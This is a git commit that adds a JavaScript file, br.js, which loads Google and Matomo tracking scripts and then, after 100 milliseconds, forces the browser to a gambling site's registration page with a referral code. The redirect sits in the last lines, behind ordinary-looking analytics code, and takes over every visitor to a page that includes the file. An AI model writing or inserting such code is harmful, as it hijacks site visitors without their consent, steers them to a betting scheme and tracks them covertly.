1039de6ae03955dc6dd95285b069e836d2ce5716
flyingfish518 <109846447+flyingfish518@users.noreply.github.com>
2024-01-28 21:20:49 +0800

    Create br.js

---
+++ js/br/br.js
@@ -0,0 +1,33 @@
+var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://www.googletagmanager.com/gtag/js?id=G-L77J3KNE1J";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+
+	  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-L77J3KNE1J');
+  
+
+
+  var _paq = window._paq = window._paq || [];
+  /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="//tongji.iiswebcdn.com/";
+    _paq.push(['setTrackerUrl', u+'matomo.php']);
+    _paq.push(['setSiteId', '3']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
+  })();
+
+
+ 
+
+setTimeout(function(){
+ window.location.href = 'https://www.jsbet888.com/pages/auth/reg?c=S8HP6X';
+},100);
